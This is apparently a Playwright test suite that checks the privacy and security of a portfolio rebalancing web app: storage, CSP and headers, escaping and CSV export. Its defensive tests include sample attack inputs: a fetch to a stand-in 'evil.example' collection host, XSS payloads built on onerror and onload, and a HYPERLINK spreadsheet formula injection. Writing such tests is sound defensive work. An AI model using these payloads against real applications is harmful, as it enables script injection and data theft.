import { expect, test } from "./fixtures";
import { FOUR_ETF, go, readDownload, seedPortfolio } from "./helpers";

const ALLOWED_PREFERENCES = [
  "driftless.lang",
  "driftless.theme",
  "driftless.activePortfolio",
  "driftless.firstUseDismissed",
];

test.describe("privacy", () => {
  // Every other E2E test also runs the network audit (see fixtures.ts): only static GETs to the
  // app's own origin, plus NBP rate lookups that carry nothing but a currency code.

  test("a full session leaves no cookies and stores nothing outside IndexedDB and tiny preferences", async ({
    page,
    context,
  }) => {
    await seedPortfolio(page, "Moje IKE – tajne");
    await go(page, "/rebalance");
    await page.getByLabel("New cash to invest (PLN)").fill("1234");

    expect(await context.cookies()).toEqual([]);
    expect(await page.evaluate(() => document.cookie)).toBe("");
    expect(await page.evaluate(() => sessionStorage.length)).toBe(0);

    const storage = await page.evaluate(() => Object.fromEntries(Object.entries(localStorage)));
    for (const key of Object.keys(storage))
      expect(ALLOWED_PREFERENCES, `unexpected localStorage key ${key}`).toContain(key);

    // Preferences hold no financial data: no ISINs, amounts, names or labels.
    const blob = JSON.stringify(storage);
    for (const secret of ["IE00B5BMR087", "SXR8", "3400", "4300", "tajne", "1234"]) {
      expect(blob, `localStorage leaks "${secret}"`).not.toContain(secret);
    }

    // The only database is ours; there is no service worker or cache quietly keeping copies.
    const dbs = await page.evaluate(async () => (await indexedDB.databases()).map((d) => d.name));
    expect(dbs).toEqual(["driftless"]);
    expect(
      await page.evaluate(async () => (await navigator.serviceWorker.getRegistrations()).length),
    ).toBe(0);
    expect(await page.evaluate(async () => (await caches.keys()).length)).toBe(0);
  });

  test("the page loads no third-party scripts, styles, fonts or images", async ({ page }) => {
    await page.goto("/#/");
    await page.getByRole("heading", { level: 1 }).waitFor();
    const external = await page.evaluate(() =>
      [
        ...document.querySelectorAll<HTMLElement>(
          "script[src],link[href],img[src],iframe[src],source[src]",
        ),
      ]
        .map((el) => (el as HTMLScriptElement).src || (el as HTMLLinkElement).href)
        .filter((url) => url && new URL(url, location.href).origin !== location.origin),
    );
    expect(external).toEqual([]);
  });

  test("security headers are present and the CSP is strict", async ({ page }) => {
    const response = await page.goto("/");
    const h = response?.headers() ?? {};
    const csp = h["content-security-policy"] ?? "";
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-(inline|eval)'/);
    expect(csp).toMatch(/connect-src 'self' https:\/\/api\.nbp\.pl(;|$)/);
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["referrer-policy"]).toBe("no-referrer");
    expect(h["permissions-policy"]).toContain("geolocation=()");
    expect(h["strict-transport-security"]).toMatch(/max-age=\d+/);
    expect(h["cross-origin-opener-policy"]).toBe("same-origin");
    expect(h["cross-origin-resource-policy"]).toBe("same-origin");
  });

  test("hashed assets are cached for a year and the shell is always revalidated", async ({
    page,
  }) => {
    const shell = await page.goto("/");
    expect(shell?.headers()["cache-control"]).toBe("no-cache");

    const asset = await page.evaluate(
      () =>
        [...document.querySelectorAll<HTMLScriptElement>("script[src]")]
          .map((s) => s.src)
          .find((src) => src.includes("/assets/")) ?? "",
    );
    expect(asset).toMatch(/\/assets\/index-[\w-]+\.js$/);
    const response = await page.request.get(asset);
    expect(response.headers()["cache-control"]).toBe("public, max-age=31536000, immutable");
    expect(response.headers()["content-security-policy"]).toContain("default-src 'self'");
  });

  test("the CSP is actually enforced by the browser (injected scripts and foreign requests are blocked)", async ({
    page,
    audit,
  }) => {
    audit.allowCsp = true;
    await page.goto("/#/");
    await page.getByRole("heading", { level: 1 }).waitFor();

    const result = await page.evaluate(async () => {
      const violations: string[] = [];
      document.addEventListener("securitypolicyviolation", (e) =>
        violations.push(e.violatedDirective),
      );
      // 1) an injected inline script must not run
      (window as unknown as Record<string, unknown>).__pwned = false;
      const script = document.createElement("script");
      script.textContent = "window.__pwned = true";
      document.head.append(script);
      // 2) data must not be sendable to an arbitrary host
      let exfiltrated = true;
      try {
        await fetch("https://evil.example/collect?x=1", { mode: "no-cors" });
      } catch {
        exfiltrated = false;
      }
      await new Promise((r) => setTimeout(r, 100));
      return {
        pwned: (window as unknown as Record<string, unknown>).__pwned,
        exfiltrated,
        violations,
      };
    });
    expect(result.pwned).toBe(false);
    expect(result.exfiltrated).toBe(false);
    expect(result.violations).toEqual(
      expect.arrayContaining([expect.stringMatching(/^(script-src|connect-src)/)]),
    );
  });

  test("user-supplied text is rendered as text, never as markup", async ({ page }) => {
    const dialogs: string[] = [];
    page.on("dialog", (d) => {
      dialogs.push(d.message());
      void d.dismiss();
    });
    const evilName = '<img src=x onerror="window.__xss=1">Evil';
    const evilLabel = '"><svg onload="window.__xss=1">';
    await seedPortfolio(
      page,
      evilName,
      [{ isin: FOUR_ETF[0]?.isin ?? "", label: evilLabel, value: "100", weight: "100" }],
      "10",
    );

    for (const route of ["/", "/portfolio", "/edit", "/rebalance", "/data"]) {
      await go(page, route);
      await page.waitForTimeout(150);
    }
    expect(
      await page.evaluate(() => (window as unknown as Record<string, unknown>).__xss),
    ).toBeUndefined();
    expect(await page.locator("img[src='x']").count()).toBe(0);
    expect(await page.locator("svg[onload]").count()).toBe(0);
    expect(dialogs).toEqual([]);

    await go(page, "/");
    await expect(page.getByRole("heading", { name: evilName })).toBeVisible(); // shown literally
  });

  test("CSV export neutralises spreadsheet formulas in user text", async ({ page }) => {
    await seedPortfolio(
      page,
      "CSV",
      [
        {
          isin: FOUR_ETF[0]?.isin ?? "",
          label: '=HYPERLINK("http://evil","x")',
          value: "100",
          weight: "100",
        },
      ],
      "10",
    );
    await go(page, "/rebalance");
    await expect(page.getByRole("table").first()).toBeVisible();
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.getByRole("button", { name: "Export plan (CSV)" }).click(),
    ]);
    const csv = await readDownload(download);
    expect(csv).toContain(`"'=HYPERLINK(""http://evil"",""x"")"`);
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
  });

  test("the privacy policy matches what the app really does", async ({ page }) => {
    const response = await page.goto("/#/privacy");
    await expect(page.getByRole("heading", { level: 1, name: "Privacy policy" })).toBeVisible();
    const policy = (await page.locator("main").textContent()) ?? "";

    // Every host the CSP lets the app contact must be disclosed in the policy.
    const csp =
      (response?.headers()["content-security-policy"] ?? "")
        .split(";")
        .map((d) => d.trim())
        .find((d) => d.startsWith("connect-src")) ?? "";
    const hosts = csp
      .split(/\s+/)
      .slice(1)
      .filter((s) => s !== "'self'")
      .map((s) => s.replace(/^https?:\/\//, ""));
    expect(hosts.length).toBeGreaterThan(0);
    for (const host of hosts) expect(policy, `policy must disclose ${host}`).toContain(host);

    // And its headline promises are the ones the other tests enforce.
    expect(policy).toMatch(/no cookies/i);
    expect(policy).toMatch(/no accounts, no analytics and no advertising/i);
    expect(policy).toMatch(/never reported anywhere automatically/i);
  });

  test("the policy is reachable from the start screen and from the navigation", async ({
    page,
    isMobile,
  }) => {
    await page.goto("/#/");
    await page.getByRole("link", { name: "Read the privacy policy" }).click();
    await expect(page.getByRole("heading", { level: 1, name: "Privacy policy" })).toBeVisible();
    if (!isMobile) {
      await go(page, "/");
      await page.getByRole("complementary").getByRole("link", { name: "Privacy policy" }).click();
      await expect(page.getByRole("heading", { level: 1, name: "Privacy policy" })).toBeVisible();
    }
  });
});
